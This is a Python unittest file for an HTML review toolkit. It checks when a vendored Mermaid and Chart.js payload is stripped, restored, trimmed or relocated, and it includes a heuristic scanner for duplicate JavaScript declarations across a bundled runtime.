#!/usr/bin/env python3
"""The vendored rich-libraries blob is carried only when the document can use it (CMH-SIZE-01).

Every document used to carry the ~1,363 KB `cmhVendoredRichLibs` payload unconditionally - 55 to
61 percent of a 2.3 MB file - stamped into the HEAD, on line 7, whether or not the document had a
single mermaid diagram or chart. It is read by exactly one consumer, the offline export, which
already knows when a document needs it.

The measurement trap these tests exist to pin: the review layer's own JavaScript contains the
selector strings `pre.mermaid`, `figure.chart canvas` and friends as STRING LITERALS, so a
detector that scans the whole document reports every document as needing the blob and the feature
silently becomes a no-op. Detection must look only inside the CONTENT region.
"""
import glob
import collections
import itertools
import json
import os
import re
import shutil
import subprocess
import sys
import time
import unittest
from html.parser import HTMLParser

HERE = os.path.dirname(os.path.abspath(__file__))
import _paths  # noqa: E402
sys.path.insert(0, _paths.TOOLS)
import vendored_libs  # noqa: E402
import new_document  # noqa: E402
from checks import links as links_check  # noqa: E402
from checks import parsing  # noqa: E402
from checks import resources  # noqa: E402


CONTENT_SPEC = os.path.join(_paths.DEV, "spec", "40-content.md")


def _spec_row(feature_id):
    """The one `dev/spec` table row a feature id owns, or "" when it has none.

    Every partial is searched rather than the one that holds the row today, so moving a row between
    partials (a routine reorganization) is not a test failure. `utf-8-sig` because a row that
    happened to land on line 1 of a BOM-bearing file would otherwise never match.
    """
    head = "| " + feature_id + " |"
    for path in sorted(glob.glob(os.path.join(_paths.DEV, "spec", "*.md"))):
        with open(path, "r", encoding="utf-8-sig") as fh:
            for line in fh:
                if line.startswith(head):
                    return line
    return ""


def _read_validator_resources():
    """The validator's mirror of the exporter's offline scanners."""
    path = os.path.join(_paths.DEV, "skill", "tools", "validate", "checks", "resources.py")
    with open(path, "r", encoding="utf-8", newline="") as fh:
        return fh.read()


def _doc(fragment):
    with open(_paths.TEMPLATE, "r", encoding="utf-8", newline="") as fh:
        template = fh.read()
    return new_document.make_document(template, fragment, key="vendored-libs-test",
                                      label="Vendored", source="doc.html", kind="report")


PROSE = "<h1>Plain</h1>\n<p>No diagrams and no charts at all.</p>"
MERMAID = '<h1>Diagram</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>'
CHART = ('<h1>Chart</h1>\n<figure class="chart">'
         '<canvas id="c" class="cmh-chart" data-cmh-chart="{}"></canvas></figure>')


def _assert_inside_the_fence(case, html, span, where):
    """The payload must land INSIDE the MACHINERY fence, not merely somewhere in the body: a
    fallback that parked it after the fence would still satisfy a body-bounds assertion while
    contradicting the fence lead that told the reader everything below it is machinery."""
    import sys as _sys
    _sys.path.insert(0, os.path.join(_paths.DEV, "skill", "tools", "authoring"))
    import upgrade as _upgrade
    begins = _upgrade._region_marker_matches(html, "BEGIN", "MACHINERY")
    ends = _upgrade._region_marker_matches(html, "END", "MACHINERY")
    case.assertEqual((len(begins), len(ends)), (1, 1), "%s: expected one machinery fence" % where)
    case.assertTrue(begins[0].start() < span[0] and span[1] < ends[0].start(),
                    "%s must sit inside the machinery fence" % where)


def _legacy_head_payload(html):
    """The same document as a PRE-CMH-SIZE-05 file: the payload back on line 7, in the head.

    Documents generated before the content-first layout carry it there, and the relocation phase
    exists for exactly them - so the fixture has to build that shape rather than read it out of a
    shell that no longer produces it.
    """
    span = vendored_libs.find_blob(html)
    assert span is not None, "fixture premise: the document carries a payload to move"
    blob = html[span[0]:span[1]]
    without = html[:span[0]] + html[span[1]:]
    anchor = without.index("<title>")
    return without[:anchor] + blob + "\n" + without[anchor:]

# An adversary for the LOCAL-BINDING half of the scripted-navigation predicate, parameterized on
# the whitespace run it plants. `%s` is the run; everything around it is what makes the predicate
# actually REACH `OFFLINE_LOCAL_LOCATION_RE` and still answer False: the run is never followed by
# an identifier, the 450 filler characters keep `location` outside the `[^)]{0,400}` window that
# follows the `(`, the trailing bare sink is what makes the predicate look for a local binding at
# all, and the trailing `const location` is the binding it then finds - which drops the verdict to
# the PREFIXED sinks, of which there are none.
_NAV_LOCAL_BINDING_EVIL = ('function%s(' + "x" * 450
                           + ';location.href="//e";const location=1;')

# The trailing half of the adversaries aimed at the SHADOW pass: an unprefixed sink (so the
# predicate looks for a local binding at all) followed by the binding it then finds, which drops
# the verdict to the PREFIXED sinks - of which there are none, so every sample answers False and
# the whole input is walked before it does.
_NAV_SHADOW_TAIL = ';location.href="//e";const location=1;'


# --- CMH-BUILD-23: one declaration per name across the concatenated runtime bundle ----------
#
# The 49 `assets/js/NN-*.js` partials are concatenated into ONE classic script wrapped in a single
# IIFE, so every partial's `function` / `const` / `let` / `var` / `class` shares one scope. A
# redeclared `function` is LEGAL there - the later one silently wins - which is how #1183 shipped
# two identical `_cmhCommentableLink` declarations through a fully green suite. The `const` case
# fails the other way: the whole bundle stops parsing, and the error names a line in a 3 MB built
# artifact rather than the identifier. Both need a scan that names the identifier and its partials.
#
# The scan is a walk, not a pattern: a regex over the raw text cannot tell a declaration from the
# same words inside a string, a comment, a template literal, or a regex literal, and cannot tell
# the SHARED scope from a local binding inside a function body (two functions may each declare
# their own `const url`, which is not a collision). What is tracked is the delimiter stack
# (`(`, `[`, `{`, and a template literal's backtick / `${`), so "shared scope" is simply "the stack
# equals the stack at the bundle's first `{`" - derived from the source rather than hardcoded, so
# rewrapping the IIFE does not silently move the check to the wrong depth.
_JS_WHITESPACE = " \t\r\n\f\v\u00a0\ufeff\u2028\u2029"
_JS_LINE_BREAKS = "\n\r\u2028\u2029"
# Unicode-aware, because a JS identifier may hold any letter: an ASCII-only class would split
# `cafe`-with-an-accent into a prefix and make two DISTINCT names collide (a false red).
_JS_ID_START = re.compile(r"[^\W\d]|\$", re.UNICODE)
_JS_ID_CHAR = re.compile(r"[\w$]", re.UNICODE)
# A `/` opens a regex literal only where a VALUE may start; after a value it is division. Both
# directions of a wrong guess corrupt the walk - reading a regex as division feeds its body to the
# delimiter stack, and reading division as a regex swallows code - so the walk reports a mismatched
# or unwound delimiter as a PROBLEM rather than carrying on quietly.
_JS_REGEX_AFTER_WORD = frozenset((
    "return", "typeof", "instanceof", "in", "new", "delete", "void", "throw",
    "case", "do", "else", "yield", "await",
))
# `of` is CONTEXTUAL: a keyword only in a `for (... of ...)` header, and an ordinary identifier
# anywhere else. So `of / 2` is division and `for (const m of /re/.exec(s))` is a regex, and the
# walk has to know which paren it is inside to tell them apart.
_JS_REGEX_AFTER_WORD_IN_FOR = frozenset(("of",))
_JS_REGEX_AFTER_PUNCT = frozenset("([{,;=:?!&|+-*%~^<>}")
# Where a DECLARATION may start. `function` and `class` are also EXPRESSIONS
# (`const f = function g() {}` binds `g` only inside itself, and `c ? function g() {} : null` is
# the same trap), so they declare only in statement position. Note `:` is deliberately ABSENT: it
# is far more often a ternary or a property than a label.
_JS_STATEMENT_HEAD = frozenset(("", "{", "}", ";", ")"))
# Word tokens after which a statement (so a declaration) may follow directly. `else function
# f() {}` is Annex B but legal and binds at the shared scope.
_JS_STATEMENT_AFTER_WORD = frozenset(("else", "do", "try", "finally"))
# Word tokens that CONTINUE an expression, so a line break in front of one does not end the
# statement: `const a = {}\n instanceof Object, b = 2` is one declarator list, not two statements.
_JS_CONTINUES_EXPRESSION = frozenset(("in", "instanceof", "of"))
# ... and word tokens that DEMAND an operand, so a line break after one does not end a statement
# either: `const a = new\n Foo(), b = 2` is still one list. The restricted productions (`return`,
# `throw`, `yield`) are deliberately absent - ASI does apply after those.
_JS_NO_ASI_AFTER_WORD = frozenset((
    "typeof", "instanceof", "in", "of", "new", "delete", "void", "await",
))
# ASI: a line break ends a statement UNLESS the previous token demands a continuation. So a
# `function` on a fresh line after `const a = 1` (no semicolon - legal, and #1183's shape could
# hide behind it) is still a declaration, while the one after `const handler =` is not. A postfix
# `++`/`--` is deliberately NOT here: it ENDS an expression, so a line break after it does end the
# statement (it is only tracked as one token so a following `/` reads as division).
_JS_NO_ASI_AFTER = frozenset((
    "=", "+", "-", "*", "/", "%", "&", "|", "^", "<", ">", "!", "~", "?", ":", ",", ".",
    "(", "[",
))
_JS_DECL_KEYWORDS = frozenset(("const", "let", "var"))
_JS_HOISTING_KEYWORDS = frozenset(("const", "let", "var", "function", "class"))

_JsScan = collections.namedtuple(
    "_JsScan", "declarations stack patterns problems scope_key scope_at")


def _js_line_end(source, i):
    """The index of the next line terminator at or after `i`, or -1. Any of the four ends a line
    comment, not just `\\n`."""
    ends = [source.find(brk, i) for brk in _JS_LINE_BREAKS]
    found = [at for at in ends if at >= 0]
    return min(found) if found else -1


def _js_ends_statement(prev):
    """Whether the token before a line break can END a statement, the other half of ASI.

    `const a = one +` cannot, so the break after it does not end the declarator list; `const a =
    one` can. Both halves have to agree before a break is a statement boundary.
    """
    return prev not in _JS_NO_ASI_AFTER and prev not in _JS_NO_ASI_AFTER_WORD


def _js_starts_statement(source, i):
    """Whether the token at `i` cannot CONTINUE an expression, so a line break before it ends one.

    ASI is decided by the token that follows the break, never by the one before it. `|| two` or
    `.prop` continues the expression a declarator list was in the middle of; an identifier, a
    literal, a `{`, a `;`, or a unary-only operator starts something new.
    """
    ch = source[i]
    if ch in "'\"`{};!~":
        return True
    if ch.isdigit():
        return True
    if source.startswith("++", i) or source.startswith("--", i):
        return True
    if _JS_ID_START.match(ch):
        end = i
        while end < len(source) and _JS_ID_CHAR.match(source[end]):
            end += 1
        return source[i:end] not in _JS_CONTINUES_EXPRESSION
    return False


def _js_shared_scope_declarations(source):
    """Every binding declared in `source`'s outermost shared scope, plus the walk's own evidence.

    Returns a `_JsScan`:

    - `declarations` - `[(kind, name, index)]` for each `function` / `class` / `const` / `let` /
      `var` binding at the shared scope.
    - `stack` - the leftover delimiter stack. It must come back EMPTY.
    - `patterns` - indices of shared-scope DESTRUCTURING bindings (`const {a, b} = x;`, including
      one that follows a comma in a declarator list). The walk does not name the bindings inside a
      pattern, so a caller must FAIL on a non-empty list rather than skip them silently.
    - `problems` - `[(index, why)]` for everything the walk knows it cannot model: a mismatched
      closer, a stack that unwound out of the shared scope (both mean a `/` was read as the wrong
      thing, or an unmodelled construct desynced the walk), and an identifier escape (`\\u0064up`
      spells a name this walk would not match).
    - `scope_key` / `scope_at` - the delimiter stack captured at the source's FIRST `{`, and its
      index. For this bundle that is the body of the one wrapping IIFE, so the shared scope is NOT
      depth 0. A caller asserts the shape rather than trusting it.

    Everything except `declarations` exists so the caller can assert the walk still WORKS: a scan
    that quietly lost track can only under-report, and under-reporting is exactly how a duplicate
    would slip through.

    KNOWN LIMITS. This is a heuristic walk, not a parser, so state what it does NOT claim. It does
    not model HOISTING out of a nested BLOCK: a `var` written inside a block or a `for` header,
    and (in sloppy mode, which this bundle is) an Annex B `function` declared inside a block or an
    `else` branch, all bind in the enclosing FUNCTION scope, so any of them can collide with a
    shared-scope name unseen. Modelling it would mean telling a block `{` from a function-body
    `{`, and the runtime has ~100 nested `var`s, so refusing them would be pure noise. More
    generally, a shape the walk does not model can make it under-report; what BOUNDS that is not
    this function but its caller's cross-checks - V8's own parse (which settles the
    `const`/`let`/`class` half outright, since a duplicate there is a SyntaxError), V8's hoisted
    top-level names, the column-0 regex, and the controls.

    Shared-scope `var` IS collected and IS held to one declaration per name - a second one is a
    real overwrite when it carries an initializer, and two partials claiming the same `var` is an
    accident worth failing on either way.
    """
    declarations = []
    patterns = []
    problems = []
    stack = []
    scope_key = None
    scope_at = -1
    unwound_at = -1
    code_after_unwind = False
    i = 0
    n = len(source)
    prev = ""                 # previous significant token: a word, a punctuator, or a marker
    line_break = True         # start of input behaves like the start of a line
    pending_async = False     # `async` seen in statement position, so `function` still declares
    in_declarator_list = False
    declarator_kind = ""
    in_template_text = False
    pending_for = False       # a `for` whose `(` is about to open a loop header
    for_parens = set()        # stack depths of the `(`s that are `for` headers

    def skip_trivia(j):
        while j < n:
            c = source[j]
            if c in _JS_WHITESPACE:
                j += 1
            elif source.startswith("//", j):
                end = _js_line_end(source, j)
                j = n if end < 0 else end + 1
            elif source.startswith("/*", j):
                end = source.find("*/", j)
                j = n if end < 0 else end + 2
            else:
                break
        return j

    def read_identifier(j):
        j = skip_trivia(j)
        if j < n and _JS_ID_START.match(source[j]):
            end = j
            while end < n and _JS_ID_CHAR.match(source[end]):
                end += 1
            return source[j:end], end
        return "", j

    def closes(opener, closer):
        return (opener, closer) in (("(", ")"), ("[", "]"), ("{", "}"), ("${", "}"))

    while i < n:
        ch = source[i]

        if in_template_text:
            if ch == "\\":
                i += 2
            elif ch == "`":
                stack.pop()
                in_template_text = bool(stack) and stack[-1] == "`"
                prev = "`"
                i += 1
            elif ch == "$" and i + 1 < n and source[i + 1] == "{":
                stack.append("${")
                in_template_text = False
                prev = "{"
                i += 2
            else:
                i += 1
            continue

        if ch in _JS_WHITESPACE:
            if ch in _JS_LINE_BREAKS:
                line_break = True
            i += 1
            continue
        # A classic script may carry Annex B HTML-like comments and a hashbang; both are trivia a
        # walk that treated them as code would desync on.
        if source.startswith("//", i) or source.startswith("<" + "!--", i) \
                or (i == 0 and source.startswith("#!", i)) \
                or (line_break and source.startswith("--" + ">", i)):
            end = _js_line_end(source, i)
            i = n if end < 0 else end
            continue
        if source.startswith("/*", i):
            end = source.find("*/", i)
            if end < 0:
                i = n
            else:
                if any(brk in source[i:end] for brk in _JS_LINE_BREAKS):
                    line_break = True
                i = end + 2
            continue
        # Reached only by a real token, never by trivia. A declarator list ends at a real ASI
        # boundary, and ASI needs BOTH sides of the break: the token before it must be able to END
        # a statement (`one +` cannot), and the token after it must not be able to CONTINUE the
        # expression (`|| two`, `.prop`, `[0]` all can). Getting either half wrong drops every
        # declarator after a wrapped initializer, which is a silent under-report.
        if in_declarator_list and line_break and scope_key is not None \
                and tuple(stack) == scope_key and _js_ends_statement(prev) \
                and _js_starts_statement(source, i):
            in_declarator_list = False
        if ch in "'\"":
            j = i + 1
            while j < n:
                if source[j] == "\\":
                    j += 2
                    continue
                if source[j] == ch:
                    break
                j += 1
            i = j + 1
            prev = "'string'"
            line_break = False
            continue
        if ch == "`":
            stack.append("`")
            in_template_text = True
            line_break = False
            i += 1
            continue
        if ch == "/":
            in_for_header = bool(stack) and (len(stack) - 1) in for_parens
            if prev in _JS_REGEX_AFTER_PUNCT or prev in _JS_REGEX_AFTER_WORD or prev == "" \
                    or (in_for_header and prev in _JS_REGEX_AFTER_WORD_IN_FOR):
                j = i + 1
                in_class = False
                closed = False
                while j < n:
                    c = source[j]
                    if c == "\\":
                        j += 2
                        continue
                    if c == "[":
                        in_class = True
                    elif c == "]":
                        in_class = False
                    elif c in _JS_LINE_BREAKS:
                        break
                    elif c == "/" and not in_class:
                        closed = True
                        break
                    j += 1
                if closed:
                    # A regex literal cannot span a line, so an unclosed guess was DIVISION after
                    # all (`a++ / 2` reads `+` as a value position). Falling through re-reads it as
                    # an operator instead of swallowing the rest of the line.
                    i = j + 1
                    while i < n and _JS_ID_CHAR.match(source[i]):   # flags
                        i += 1
                    prev = "/regex/"
                    line_break = False
                    continue
            prev = "/"
            line_break = False
            i += 1
            continue
        if ch in "([":
            if ch == "(" and pending_for:
                for_parens.add(len(stack))
            pending_for = False
            stack.append(ch)
            prev = ch
            line_break = False
            i += 1
            continue
        if ch in ")]}":
            opener = stack.pop() if stack else ""
            for_parens.discard(len(stack))
            if not closes(opener, ch):
                problems.append((i, "a %r closed a %r" % (ch, opener or "nothing")))
            if ch == "}" and opener == "${":
                in_template_text = True
            if scope_key is not None and unwound_at < 0 and len(stack) < len(scope_key):
                unwound_at = i
            prev = ch
            line_break = False
            i += 1
            continue
        if ch == "{":
            stack.append("{")
            if scope_key is None:
                scope_key = tuple(stack)
                scope_at = i
            elif unwound_at >= 0:
                code_after_unwind = True
            prev = "{"
            line_break = False
            i += 1
            continue
        if ch == "\\":
            # Only ever legal here as an identifier escape, which spells a name this walk would
            # read as a different one. Fail closed rather than compare the wrong names.
            problems.append((i, "an identifier escape the walk does not decode"))
            prev = "\\"
            line_break = False
            i += 1
            continue
        if _JS_ID_START.match(ch):
            word, after = read_identifier(i)
            member = prev == "."          # `obj.of` is a property, not the `of` keyword
            if unwound_at >= 0 and word in _JS_HOISTING_KEYWORDS:
                # A DECLARATION after the wrapper closed means the walk is reading at the wrong
                # depth; a plain trailing statement (`window.cmhReady();` after `})();`) does not,
                # and refusing that would red a legitimate bootstrap line.
                code_after_unwind = True
            shared = scope_key is not None and tuple(stack) == scope_key
            statement = (prev in _JS_STATEMENT_HEAD or prev in _JS_STATEMENT_AFTER_WORD
                         or (line_break and _js_ends_statement(prev)))
            if shared and statement:
                # A LABEL, not an expression or a declaration: `retry: function dup() {}` declares
                # `dup` in this scope just as a bare declaration would (sloppy mode), and `let:
                # foo(), x = 1;` is a labelled comma expression, not a `let` declarator list.
                # Consume the colon and keep the statement position. A ternary's colon never
                # reaches here - its left operand is not in statement position.
                colon = skip_trivia(after)
                if colon < n and source[colon] == ":" and not source.startswith("::", colon) \
                        and word not in ("function", "class", "async"):
                    in_declarator_list = False
                    prev = ";"
                    line_break = False
                    i = colon + 1
                    continue
            if shared and word in _JS_DECL_KEYWORDS and prev != ".":
                # A declaration keyword is never an expression, so it needs no statement position -
                # which is what keeps a semicolon-less predecessor from hiding it.
                name, _ = read_identifier(after)
                if name:
                    declarations.append((word, name, i))
                    in_declarator_list = True
                    declarator_kind = word
                elif skip_trivia(after) < n and source[skip_trivia(after)] in "{[":
                    patterns.append(i)
                    in_declarator_list = True
                    declarator_kind = word
                else:
                    # Not a declaration at all: in sloppy mode `let` is a legal identifier, so
                    # `let = 1, dup = 2;` is a comma expression. Entering declarator mode here
                    # would invent a `let dup` and red an innocent partial.
                    in_declarator_list = False
            elif shared and (statement or pending_async) and word == "function":
                start = skip_trivia(after)
                if start < n and source[start] == "*":       # generator
                    start = skip_trivia(start + 1)
                name, _ = read_identifier(start)
                if name:
                    declarations.append(("function", name, i))
            elif shared and statement and word == "class":
                name, _ = read_identifier(after)
                if name:
                    declarations.append(("class", name, i))
            elif shared and in_declarator_list and prev == ",":
                # `let a = 1, b = 2;` - the stack is back at the shared scope, so the comma really
                # does separate declarators rather than sitting inside a call or an array.
                declarations.append((declarator_kind, word, i))
            pending_async = word == "async" and shared and statement
            pending_for = word == "for"
            # A keyword used as a PROPERTY (`obj.of`, `obj.return`) must not put the walk in a
            # value position, or the next `/` is read as a regex and swallows the line.
            prev = "'member'" if member else word
            line_break = False
            i = after
            continue
        if ch == "," and scope_key is not None and tuple(stack) == scope_key \
                and in_declarator_list:
            # The other half of the destructuring check: `const a = 1, {b} = x;` binds `b` too.
            nxt = skip_trivia(i + 1)
            if nxt < n and source[nxt] in "{[":
                patterns.append(i)
        if ch == ";" and scope_key is not None and tuple(stack) == scope_key:
            # Only a shared-scope `;` ends the declarator list; one inside an arrow body
            # (`const a = () => { return 1; }, b = 2;`) must not hide `b`.
            in_declarator_list = False
        if (ch == "+" and source.startswith("++", i)) or (ch == "-" and source.startswith("--", i)):
            prev = ch * 2      # postfix update, so a following `/` is division, not a regex
            line_break = False
            i += 2
            continue
        prev = ch
        line_break = False
        i += 1

    if code_after_unwind:
        problems.append((unwound_at, "the delimiter stack unwound out of the shared scope with "
                                     "code still to come"))
    return _JsScan(declarations, stack, patterns, problems, scope_key, scope_at)


class NeedsDetectionTests(unittest.TestCase):
    """CMH-SIZE-01: whether a document can use the blob is decided from its CONTENT only."""

    def test_a_prose_only_document_does_not_need_the_libraries(self):
        self.assertFalse(vendored_libs.content_needs_rich_libs(_doc(PROSE)))

    def test_a_document_with_a_mermaid_diagram_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(MERMAID)))

    def test_a_document_with_a_chart_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(CHART)))

    def test_the_review_layers_own_selector_strings_do_not_count_as_usage(self):
        # THE trap. The built layer JS contains `pre.mermaid, div.mermaid, figure.chart canvas,
        # canvas.cmh-chart` as a literal selector string. A whole-document scan matches it and
        # reports every document as a user, which would make the whole feature a silent no-op.
        html = _doc(PROSE)
        self.assertIn("pre.mermaid", html, "fixture premise: the layer carries the selector text")
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_usage_written_after_the_content_region_does_not_count(self):
        # Only the CONTENT region is authored; anything outside it belongs to the layer.
        html = _doc(PROSE).replace("</body>", '<pre class="mermaid">x</pre></body>')
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_a_document_with_no_content_markers_is_treated_as_needing_them(self):
        # Fail SAFE: if the region cannot be located we must not strip a payload the document
        # might rely on. A too-large document is a cost; a broken offline export is a defect.
        self.assertTrue(vendored_libs.content_needs_rich_libs("<html><body>hi</body></html>"))


class StripAndRestoreTests(unittest.TestCase):
    """CMH-SIZE-01: the blob is removed when unusable and restored when it becomes usable."""

    def setUp(self):
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            self.shareable = fh.read()
        self.blob = vendored_libs.blob_script(self.shareable)
        self.assertTrue(self.blob, "the built SHAREABLE template must carry the blob")

    def test_the_blob_is_removed_from_a_prose_only_document(self):
        html = _doc(PROSE)
        self.assertIsNotNone(vendored_libs.find_blob(html))
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertLess(len(out), len(html) - 1000 * 1024, "the saving must be the real payload")

    def test_the_blob_is_kept_for_a_document_that_uses_charts(self):
        html = _doc(CHART)
        out, _changed = vendored_libs.apply(html, self.blob)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_the_blob_is_restored_when_a_document_gains_a_diagram(self):
        # The correctness risk of conditional stamping: a document stripped while it was prose
        # must get the payload back the moment it gains a diagram, or its offline export breaks.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        self.assertIsNone(vendored_libs.find_blob(stripped))
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_a_restored_blob_is_placed_at_the_end_of_the_body(self):
        # Observability: on line 7 the payload makes the head of the file unreadable to any tool
        # that reads the start of a document.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, _ = vendored_libs.apply(grew, self.blob)
        span = vendored_libs.find_blob(out)
        # rfind, not index: the layer's own JS contains the literal "</body>" (it builds export
        # markup), so the FIRST occurrence is not the document's real body end.
        body_end = out.lower().rfind("</body>")
        self.assertGreater(span[0], out.rindex("</main>"),
                           "the restored payload must sit after the document content")
        self.assertLessEqual(span[1], body_end)
        _assert_inside_the_fence(self, out, span, "a restored payload")

    def test_a_head_placed_payload_is_moved_out_of_the_head(self):
        # A LEGACY document (the shell stamped the payload into the head until CMH-SIZE-05) still
        # needs the payload, and must not keep carrying it on line 7.
        html = _legacy_head_payload(_doc(CHART))
        head_end = html.lower().find("</head>")
        self.assertLess(vendored_libs.find_blob(html)[0], head_end,
                        "fixture premise: the legacy document carries the payload in the head")
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertGreater(vendored_libs.find_blob(out)[0], out.lower().find("</head>"))
        self.assertLessEqual(vendored_libs.find_blob(out)[1], out.lower().rfind("</body>"))
        _assert_inside_the_fence(self, out, vendored_libs.find_blob(out), "a relocated payload")

    def test_applying_twice_is_a_no_op(self):
        once, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        twice, changed = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed, "a second pass must not churn the document")
        self.assertEqual(twice, once)

    def test_applying_twice_is_a_no_op_for_a_document_that_keeps_the_payload(self):
        # The relocation must settle: a legacy head-placed payload is rewritten once and then left
        # byte-identical, or every finalize would churn it.
        once, changed = vendored_libs.apply(_legacy_head_payload(_doc(CHART)), self.blob)
        self.assertTrue(changed)
        twice, changed_again = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed_again, "an already-placed payload must not be rewritten")
        self.assertEqual(twice, once)

    def test_a_current_document_keeps_its_payload_untouched(self):
        # CMH-SIZE-05: the shell already places the payload after the content, so finalize's
        # relocation phase has nothing to do - a fresh document must come back byte-identical.
        # The content uses BOTH libraries, so the per-library trim has nothing to do either and
        # this stays a test of PLACEMENT rather than of right-sizing.
        html = _doc(CHART + "\n" + MERMAID)
        span = vendored_libs.find_blob(html)
        self.assertIsNotNone(span)
        self.assertGreater(span[0], html.rindex("</main>"),
                           "fixture premise: the shell places the payload after the content")
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertFalse(changed, "a current document must not be rewritten")
        self.assertEqual(out, html)

    def test_a_document_that_cannot_be_classified_is_never_grown(self):
        # Fail-safe must mean "leave it alone", NOT "add a payload". A foreign document has no
        # content root at all; inserting 1.3 MB into it would be far worse than doing nothing.
        foreign = "<html><body><p>not one of ours</p></body></html>\n"
        self.assertEqual(vendored_libs.content_state(foreign), vendored_libs.UNKNOWN)
        out, changed = vendored_libs.apply(foreign, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, foreign)

    def test_a_classifiable_document_without_rich_content_is_never_grown(self):
        # It has a content root and uses nothing, so it is UNUSED - which must mean "strip if
        # present", never "insert". A document that never carried the payload stays as it is.
        minimal = '<html><body><main id="commentRoot">hi</main></body></html>\n'
        self.assertEqual(vendored_libs.content_state(minimal), vendored_libs.UNUSED)
        out, changed = vendored_libs.apply(minimal, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, minimal)

    def test_stripping_without_a_blob_source_still_works(self):
        # Removal must never depend on having a payload to restore: an agent stripping a
        # document should not need the skill's built template to be reachable.
        out, changed = vendored_libs.apply(_doc(PROSE), None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))

    def test_a_needed_but_missing_blob_is_left_alone_when_there_is_no_source(self):
        stripped, _ = vendored_libs.apply(_doc(PROSE), None)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, None)
        self.assertFalse(changed, "with no payload available the document must be left as it is")
        self.assertEqual(out, grew)


class PerLibraryPayloadTests(unittest.TestCase):
    """CMH-SIZE-01: the payload carries each vendored library only when the CONTENT uses THAT one.

    The payload used to be all-or-nothing: one JSON object holding mermaid (~1,265 KB base64) AND
    Chart.js (~92 KB base64), kept or dropped as a unit. So a chart-only document paid 1,265 KB for
    a renderer it could never call, and a diagram-only document paid 92 KB for the other.

    The dangerous direction is dropping a half the document DOES need, which breaks its offline
    export, so every test here that trims is paired with one that proves the fail-safe still holds.
    """

    def setUp(self):
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            self.shareable = fh.read()
        self.blob = vendored_libs.blob_script(self.shareable)
        self.assertTrue(self.blob, "the built SHAREABLE template must carry the blob")

    def _payload(self, html):
        span = vendored_libs.find_blob(html)
        self.assertIsNotNone(span, "expected the document to carry a payload")
        return vendored_libs.payload_object(html[span[0]:span[1]])

    def test_the_restore_source_template_carries_both_libraries(self):
        # The whole restore path reads this one artifact. It carries both halves only because the
        # shell's demo content happens to use both, so pin it: if the demo ever loses its chart,
        # every chart document restored from this source would ship under-provisioned.
        obj = vendored_libs.payload_object(self.blob)
        self.assertIsNotNone(obj, "the template payload must parse")
        self.assertEqual(vendored_libs.carried_libs(obj), {"mermaid", "chartjs"})

    def test_a_chart_only_document_drops_the_mermaid_half_of_the_payload(self):
        out, changed = vendored_libs.apply(_doc(CHART), self.blob)
        self.assertTrue(changed)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"chartjs"})

    def test_a_diagram_only_document_drops_the_chart_half_of_the_payload(self):
        out, changed = vendored_libs.apply(_doc(MERMAID), self.blob)
        self.assertTrue(changed)
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid"})

    def test_a_chart_only_document_sheds_the_real_mermaid_bytes(self):
        # Prove the SAVING, not just the key set: the mermaid half is ~1,265 KB base64.
        html = _doc(CHART)
        out, _ = vendored_libs.apply(html, self.blob)
        self.assertLess(len(out), len(html) - 1000 * 1024)

    def test_a_partial_payload_is_completed_when_the_document_gains_the_other_library(self):
        # THE regression guard. Once a payload can be partial, "restore when the content GAINS a
        # library" (CMH-SIZE-01) has to work for a HALF as well as for a whole - and the old
        # apply() returned early for any already-placed payload without ever reading its contents.
        chart_only, _ = vendored_libs.apply(_doc(CHART), self.blob)
        self.assertEqual(vendored_libs.carried_libs(self._payload(chart_only)), {"chartjs"})
        grew = chart_only.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed, "a partial payload must be completed, not left as it is")
        self.assertEqual(vendored_libs.carried_libs(self._payload(out)), {"mermaid", "chartjs"})

    def test_an_unclassifiable_document_keeps_a_full_payload_untouched(self):
        # The fail-safe INVERSION this design could have caused: an UNKNOWN document has neither
        # usage flag set, so a naive "needed" set is EMPTY and would strip it bare. The existing
        # cannot-be-classified test pins only the INSERT direction; this pins the TRIM direction.
        foreign = "<html><body><p>not one of ours</p>\n" + self.blob + "</body></html>\n"
        self.assertEqual(vendored_libs.content_state(foreign), vendored_libs.UNKNOWN)
        out, changed = vendored_libs.apply(foreign, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, foreign)

    def test_mermaid_plus_misnested_chart_markup_keeps_the_chart_half(self):
        # A browser REPAIRS `<p><figure class="chart"></p>...<canvas>` and puts the canvas back
        # inside the figure, so the exporter will demand Chart.js. The nesting-tolerant repair used
